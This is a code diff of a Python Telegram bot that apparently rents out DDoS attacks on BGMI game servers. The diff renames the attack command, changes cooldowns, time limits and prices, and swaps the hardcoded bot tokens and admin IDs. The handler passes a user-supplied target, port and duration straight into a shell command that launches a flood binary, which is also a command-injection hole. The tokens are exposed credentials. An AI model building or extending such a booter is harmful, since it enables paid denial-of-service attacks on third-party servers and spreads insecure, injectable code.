@@ -8,10 +8,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('6878046471:AAGEwxX9NIV6CRF1_xpqGwHGaEKREPRKXPM')
+bot = telebot.TeleBot('6753538511:AAHsnpFmvx_K1uNeZAJIZjsj5s44WSrcxvE')
 
 # Admin user IDs
-admin_id = {"5826548994"}
+admin_id = {"1718738219", "5826548994"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -204,7 +204,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: KINGxVIP\nBy @KINGMOHITYT"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -213,15 +213,15 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['soul'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
-                response = "You Are On Cooldown . Please Wait 15 second Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
+                response = "You Are On Cooldown . Please Wait 5min Before Running The /soul Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -232,19 +232,19 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 300:
-                response = "Error: Time interval must be less than 180."
+            if time > 181:
+                response = "Error: Time interval must be less than 80."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/soul', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./RAGNAROK {target} {port} {time} 500"
+                full_command = f"./soul {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time} 500"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /Soul <target> <port> <time>"  # Updated command syntax
     else:
-        response = " You Are Not Authorized To Use This Command Buy Now @KINGMOHITYT."
+        response = " You Are Not Authorized To Use This Command ."
 
     bot.reply_to(message, response)
 
@@ -266,7 +266,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "You Are Not Authorized To Use This Command Buy Now @KINGMOHITYT."
+        response = "You Are Not Authorized To Use This Command ."
 
     bot.reply_to(message, response)
 
@@ -274,7 +274,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
+💥 /soul : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
@@ -296,8 +296,8 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''KESI HO VIRAT ARMY , {user_name}! KING KOHLI 👑🇮🇳.
-    @KINGMOHITYT
+    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
+    @KINGMOHITYT @KINGMOHITYT
 🤖Try To Run This Command : /help 
 '''
     bot.reply_to(message, response)
@@ -324,7 +324,7 @@ Vip 🌟 :
 
 Pr-ice List💸 :
 Day-->100 Rs
-Week-->600 Rs
+Week-->400 Rs
 Month-->800 Rs
 '''
     bot.reply_to(message, response)
